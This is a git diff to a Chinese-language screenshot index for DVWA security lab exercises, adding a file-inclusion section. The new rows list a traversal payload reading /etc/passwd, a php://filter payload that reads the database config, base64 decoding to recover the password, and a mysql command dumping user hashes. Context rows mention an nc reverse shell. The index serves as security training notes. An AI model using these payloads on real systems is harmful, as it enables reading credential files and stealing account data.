@@ -42,6 +42,17 @@
 | 19b | 19b-反弹shell-nc收到shell.png | nc 收到 `www-data@kali` 的 shell |
 | 20 | 20-命令执行-High-黑名单源码.png | `$substitutions` 数组，能看到 `'\| '` 带空格 |
 
+## 文件包含
+
+| 编号 | 文件 | 说明 |
+|---|---|---|
+| 21 | 21-文件包含-Low-读passwd.png | `?page=../../../etc/passwd` → 输出完整用户表 |
+| 22 | 22-文件包含-Low-base64读配置.png | `php://filter/convert.base64-encode/resource=/var/www/html/DVWA/config/config.inc.php` → 一大段 base64 |
+| 23 | 23-文件包含-Low-解码得db密码.png | `echo '...' \| base64 -d \| grep db_password` → `p@ssw0rd` |
+| 24 | 24-文件包含-Low-数据库凭据验证.png | `mysql -u dvwa -p'p@ssw0rd' -e "select user,password from users"` → 5 个用户哈希 |
+
+> **21 → 24 是一条完整攻击链**：读 passwd（情报）→ 读配置文件（绕过执行）→ 解出密码 → 连数据库拿下全部账号。单看 21 只是"能读文件"，看到 24 才是"能读业务数据"。
+
 ---
 
 ## 命名规范
